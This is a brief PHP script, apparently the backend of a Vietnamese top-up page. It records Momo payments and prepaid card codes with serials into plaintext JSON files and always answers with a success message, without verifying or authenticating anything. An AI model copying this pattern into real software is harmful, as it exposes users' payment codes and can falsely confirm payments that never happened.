<?php
header('Content-Type: application/json; charset=utf-8');

$type = $_POST['type'] ?? '';
$email = $_POST['email'] ?? '';
$amount = $_POST['amount'] ?? 0;

if ($type === 'momo') {
    $file = 'bank.json';
    $data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    if (!is_array($data)) $data = [];

    $data[] = [
        "time" => date("Y-m-d H:i:s"),
        "email" => $email,
        "amount" => $amount
    ];

    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    echo json_encode(["message" => "Nạp Momo thành công!"]);
}
elseif ($type === 'card') {
    $cardType = $_POST['cardType'] ?? '';
    $code = $_POST['code'] ?? '';
    $serial = $_POST['serial'] ?? '';

    $file = 'the.json';
    $data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    if (!is_array($data)) $data = [];

    $data[] = [
        "time" => date("Y-m-d H:i:s"),
        "email" => $email,
        "type" => $cardType,
        "amount" => $amount,
        "code" => $code,
        "serial" => $serial
    ];

    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    echo json_encode(["message" => "Nạp thẻ thành công!"]);
}
else {
    echo json_encode(["message" => "Dữ liệu không hợp lệ"]);
}

